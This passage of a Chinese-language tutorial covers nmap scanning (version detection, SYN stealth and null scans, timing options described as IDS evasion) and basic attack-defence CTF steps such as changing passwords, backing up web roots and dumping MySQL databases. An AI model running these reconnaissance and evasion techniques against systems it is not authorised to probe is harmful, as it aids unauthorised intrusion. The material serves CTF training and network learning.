<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -p <span class="number">80</span>,<span class="number">443</span> <span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) <span class="meta">at</span> <span class="number">2013</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">10</span>:<span class="number">56</span> EST</span><br><span class="line">Interesting ports on server2.tecmint.com (<span class="number">192.168</span><span class="meta">.0</span><span class="meta">.101</span>):</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line"><span class="number">80</span>/tcp  open   http</span><br><span class="line"><span class="number">443</span>/tcp closed https</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> <span class="built_in">IP</span> address (<span class="number">1</span> host <span class="meta">up</span>) scanned <span class="keyword">in</span> <span class="number">0.190</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="22-扫描指定范围内的端口"><a href="#22-扫描指定范围内的端口" class="headerlink" title="22.扫描指定范围内的端口"></a>22.扫描指定范围内的端口</h3><p>您可以使用表达式来扫描某个范围内的端口。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]#  nmap -p <span class="number">80</span><span class="number">-160</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br></pre></td></tr></table></figure>

<h3 id="23-查找主机服务版本号-sV"><a href="#23-查找主机服务版本号-sV" class="headerlink" title="23.查找主机服务版本号-sV"></a>23.查找主机服务版本号-sV</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -sV <span class="number">192.168</span><span class="number">.0</span><span class="number">.101</span></span><br><span class="line"> </span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">4.11</span> ( http://www.insecure.org/nmap/ ) at <span class="number">2013</span><span class="number">-11</span><span class="number">-11</span> <span class="number">17</span>:<span class="number">48</span> <span class="type">EST</span></span><br><span class="line"><span class="type">Interesting</span> ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((<span class="type">CentOS</span>))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (<span class="type">Cadmus</span> <span class="type">Computer</span> <span class="type">Systems</span>)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 12.624 seconds</span><br></pre></td></tr></table></figure>

<h3 id="24-使用TCP-ACK-PA-和TCP-Syn-PS-扫描远程主机"><a href="#24-使用TCP-ACK-PA-和TCP-Syn-PS-扫描远程主机" class="headerlink" title="24.使用TCP ACK (-PA)和TCP Syn (-PS)扫描远程主机"></a>24.使用TCP ACK (-PA)和TCP Syn (-PS)扫描远程主机</h3><p>有时候包过滤防火墙会阻断标准的ICMP ping请求，在这种情况下，我们可以使用<strong>TCP ACK</strong>和<strong>TCP Syn</strong>（tcp探测扫描）方法来扫描远程主机。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">17</span>:<span class="number">51</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.360</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="25-使用TCP-ACK扫描远程主机上特定的端口-PA-p"><a href="#25-使用TCP-ACK扫描远程主机上特定的端口-PA-p" class="headerlink" title="25.使用TCP ACK扫描远程主机上特定的端口-PA -p"></a>25.使用TCP ACK扫描远程主机上特定的端口-PA -p</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PA -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">02</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.166</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="26-使用TCP-Syn扫描远程主机上特定的端口"><a href="#26-使用TCP-Syn扫描远程主机上特定的端口" class="headerlink" title="26. 使用TCP Syn扫描远程主机上特定的端口"></a>26. 使用TCP Syn扫描远程主机上特定的端口</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -PS -<span class="keyword">p</span> <span class="number">22</span>,<span class="number">80</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">08</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.165</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="27-执行一次隐蔽的扫描-sS"><a href="#27-执行一次隐蔽的扫描-sS" class="headerlink" title="27.执行一次隐蔽的扫描-sS"></a>27.执行一次隐蔽的扫描-sS</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sS <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">10</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.383</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="28-使用TCP-Syn扫描最常用的端口-sT"><a href="#28-使用TCP-Syn扫描最常用的端口-sT" class="headerlink" title="28.使用TCP Syn扫描最常用的端口-sT"></a>28.使用TCP Syn扫描最常用的端口-sT</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -sT <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">18</span>:<span class="number">12</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.406</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="29-执行TCP空扫描以骗过防火墙-sN"><a href="#29-执行TCP空扫描以骗过防火墙-sN" class="headerlink" title="29.执行TCP空扫描以骗过防火墙-sN"></a>29.执行TCP空扫描以骗过防火墙-sN</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -<span class="keyword">sN</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">19</span>:<span class="number">01</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>|filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>|filtered http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>|filtered rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>|filtered unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>|filtered mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>|filtered <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">1.584</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="指令分类"><a href="#指令分类" class="headerlink" title="指令分类"></a>指令分类</h3><h4 id="初级使用"><a href="#初级使用" class="headerlink" title="初级使用"></a>初级使用</h4><p>nmap -v scanme.nmap.org</p>
<p>这个选项扫描主机scanme.nmap.org中所有的保留TCP端口。选项-v启用细节模式。</p>
<p>nmap -A -T4 scanme.nmap.org</p>
<p>-A用来进行操作系统及其版本的探测，-T4 可以加快执行速度</p>
<p>nmap -sS -O scanme.nmap.org/24</p>
<p>进行秘密SYN扫描，对象为主机Saznme所在的“C类”网段的255台主机。同时尝试确定每台工作主机的操作系统类型。因为进行SYN扫描 和操作系统检测，这个扫描需要有根权限。</p>
<p>nmap -sV -p 22，53，110，143，4564 198.116.0-255.1-127</p>
<p>进行主机列举和TCP扫描，对象为B类198.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口 打开，将使用版本检测来确定哪种应用在运行。(-sV)</p>
<p>nmap -v -iR 100000 -P0 -p 80</p>
<p>随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-P0禁止对主机列表。</p>
<p>nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</p>
<p>扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。</p>
<p>host -l company.com | cut -d -f 4 | nmap -v -iL -</p>
<p>进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU/Linux – 其它系统进行区域传输时有不同的命令。</p>
<h4 id="深入扫描命令"><a href="#深入扫描命令" class="headerlink" title="深入扫描命令"></a>深入扫描命令</h4><p>-Pn  不探测扫描（假定所有主机都存活）</p>
<p>-PB  默认探测扫描（探测端口：TCP 80，445&amp;ICMP）</p>
<p>-PS  &lt;portlist&gt;  tcp探测扫描</p>
<p>-PE  ICMP Echo Request</p>
<p>-PP  ICMP Timestamp Request</p>
<p>-PM  ICMP Netmask Request</p>
<h4 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h4><p>-sP  只探测主机在线情况</p>
<p>-sS  SYN扫描（隐身扫描）</p>
<p>-ST  TCP扫描</p>
<p>-sU  UDP扫描</p>
<p>-sV  系统版本检测</p>
<p>-O   操作系统识别</p>
<p>–scanflags  指定TCP标识位（设置URG, ACK, PSH,RST,SYN,FIN位）</p>
<h4 id="细粒度的时间选项"><a href="#细粒度的时间选项" class="headerlink" title="细粒度的时间选项"></a>细粒度的时间选项</h4><p>–min-hostgroup/max-hostgroup <size>  平行的主机扫描组的大小</size></p>
<p>–min-parallelism/max-parallelism <numprobes>  并行探测</numprobes></p>
<p>–min-rtt-timeout/max-rtttimeout/initial-rtt-timeout <time>   指定每轮探测的时间</time></p>
<p>–max-retries <tries>    扫描探测的上限次数设定</tries></p>
<p>–host-timeout <time>    设置timeout时间</time></p>
<p>–scan-delay/–max-scan-delay <time>  调整两次探测之间的延迟</time></p>
<p>–min-rate <number>     每秒发送数据包不少于<number>次</number></number></p>
<h4 id="时序选项"><a href="#时序选项" class="headerlink" title="时序选项"></a>时序选项</h4><p>-T0  偏执的：非常非常慢，用于IDS逃逸</p>
<p>-T1  猥琐的：相当慢，用于IDS逃逸</p>
<p>-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</p>
<p>-T3  普通的：默认，根据目标的反应自动调整时间模式</p>
<p>-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</p>
<p>-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</p>
<h4 id="misc选项"><a href="#misc选项" class="headerlink" title="misc选项"></a>misc选项</h4><p>-n  禁止反向IP地址查找</p>
<p>-6  只是用 IPv6</p>
<p>-A  是用几个命令：OS 探测，版本探测，脚本扫描，traceroute</p>
<p>–reason 列出nmap的判断：端口开放，关闭，被过滤。</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>-oN  标准输出</p>
<p>-oG  好理解的格式</p>
<p>-ox  xml格式</p>
<p>-oA&lt;basename&gt;  用&lt;basename&gt;生成以上格式的文件 </p>
<h3 id="线下AWD必须用好的nmap指令"><a href="#线下AWD必须用好的nmap指令" class="headerlink" title="线下AWD必须用好的nmap指令"></a>线下AWD必须用好的nmap指令</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.9</span> 使用nmap扫描主机</span><br><span class="line"><span class="comment">//  http://nmap.org/book/</span></span><br><span class="line">#nmap --version  <span class="comment">// -V -h</span></span><br><span class="line">#man nmap	</span><br><span class="line"></span><br><span class="line">#nmap -vv 	-vv参数设置对结果的详细输出</span><br><span class="line">#nmap -sS -Pn -A host	隐身、操作系统信息和路由跟踪、-P0和-Pn两个选项的效果是一样的，就是不进行主机发现，而直接进行更深层次的扫描，如服务版本扫描或系统类型扫描。-Pn  不探测扫描（假定所有主机都存活）</span><br><span class="line"></span><br><span class="line">#nmap -A -T4 scanme.nmap.org</span><br><span class="line"><span class="comment">// -A:to enable OS and version detection, script scanning,and traceroute;</span></span><br><span class="line"><span class="comment">// -T4:faster execution加快执行速度</span></span><br><span class="line"></span><br><span class="line">#nmap localhost</span><br><span class="line"><span class="comment">// #netstat -apn | grep 8080 ===&gt; port 8080 process</span></span><br><span class="line"></span><br><span class="line">*多机快速扫描</span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span>	-sP是使用ICMP协议发送echo请求数据包，但是很容易被防火墙过滤掉。</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;在线主机</span></span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'report for.*[<span class="number">0</span><span class="number">-9</span>]$'</span><br><span class="line">#nmap -v -n -sP --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;在线主机:端口开放  -n 禁止反向IP地址查找</span></span><br><span class="line">#nmap -v -n -sS -Pn -p22 --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p21，<span class="number">22</span>，<span class="number">80</span>，<span class="number">8080</span>，<span class="number">3306</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p1<span class="number">-1024</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">--max-rtt-timeout调整探测报文超时</span><br><span class="line"></span><br><span class="line">&gt; results.txt	重定向发送到文件</span><br></pre></td></tr></table></figure>

<h3 id="番外AWD"><a href="#番外AWD" class="headerlink" title="番外AWD"></a>番外AWD</h3><p>附上AWD基操</p>
<h4 id="1、确定环境是密码登录还是密钥登录"><a href="#1、确定环境是密码登录还是密钥登录" class="headerlink" title="1、确定环境是密码登录还是密钥登录"></a>1、确定环境是密码登录还是密钥登录</h4><p>密钥登录：（比赛方会提供如下三个文件）</p>
<p>id_rsa</p>
<p>id_rsa.pub</p>
<p>token.txt</p>
<p>文件导入即可</p>
<p>若为密码登录，则看密码是否为随机的哈希值，并推测全场密码是否一样，若一样则首先需要修改密码，避免对方写批量遍历脚本，遍历所有服务器，当可以登录时，就瞬间修改你的机子，然后你就什么都做不了，服务器都落到对方手中，除非重置机子。</p>
<p>修改密码：passwd 用户名    //linux命令</p>
<p>​                    passwd ubuntu sudo passwd root   //ubuntu命令： </p>
<p>​                    w   //查看当前登录的用户 </p>
<p>​                    kill -kill -t 用户的tty   //踢掉当前登录的用户</p>
<h4 id="2、迅速备份源码和数据库到本机"><a href="#2、迅速备份源码和数据库到本机" class="headerlink" title="2、迅速备份源码和数据库到本机"></a>2、迅速备份源码和数据库到本机</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="regexp">/这里假定web目录为/var</span><span class="regexp">/www/html</span></span><br><span class="line">mkdir -p ~<span class="regexp">/beifen</span></span><br><span class="line"><span class="regexp">cp -ra /var</span><span class="regexp">/www/html</span><span class="regexp">/. ~/beifen</span></span><br><span class="line">其中~代表用户的家目录，-r是递归，-a是保留原来文件属性， .是代表所有文件（不用*，因为*无法表示所有文件）</span><br></pre></td></tr></table></figure>

<p>定时备份源码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=<span class="string">"/var/www/<span class="variable">$time</span>.tar.gz"</span></span><br><span class="line">webdir=<span class="string">"/var/www/html"</span></span><br><span class="line">tar zcvf <span class="variable">$bak_file</span> <span class="variable">$webdir</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //一分钟备份一次</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h4 id="3、找配置文件-amp-mysql一些操作"><a href="#3、找配置文件-amp-mysql一些操作" class="headerlink" title="3、找配置文件&amp;mysql一些操作"></a>3、找配置文件&amp;mysql一些操作</h4><p>找配置文件，找文件名有con、config、db字样的。在刚才备份的文件那里可以使用linux命令</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">name</span> <span class="string">'*name*'</span></span><br></pre></td></tr></table></figure>

<p>找到这些文件后，最主要找一些账号密码，例如mysql账号密码，如果找到了，自己可以修改自己服务器上的mysql密码，命令如下：（先自己登陆进去）</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update<span class="built_in"> user </span><span class="builtin-name">set</span> <span class="attribute">password</span>=PASSWORD("新的密码") where <span class="attribute">user</span>=<span class="string">'root'</span>; </span><br><span class="line">mysql&gt; flush privileges; (刷新)</span><br><span class="line">mysql&gt; exit</span><br></pre></td></tr></table></figure>

<p>记得修改了mysql密码后，还要把刚才找到的配置文件的密码给修改了，不然你的web服务就会不正常。</p>
<p>得到mysql密码，一般来说你就可以看看你自己mysql数据库里的数据，一般来说别人的数据库记录也是如此，所以别人一些后台账号密码，你都可以找到的（如果里面入库是不经过哈希处理的）</p>
<p>另外，也多注意有什么别的配置文件。</p>
<p>备份数据库</p>
<p>​        </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mysql备份指定数据库 </span></span><br><span class="line">mysqldump -u 用户名 -<span class="selector-tag">p</span> 密码 数据库名 &gt; back<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//mysql备份所有数据库 </span></span><br><span class="line">mysqldump --all-databases &gt; bak<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//还原mysql数据库 </span></span><br><span class="line">mysql -u 用户名 -<span class="selector-tag">p</span> 密码 数据库名 &lt; bak.sql</span><br></pre></td></tr></table></figure>

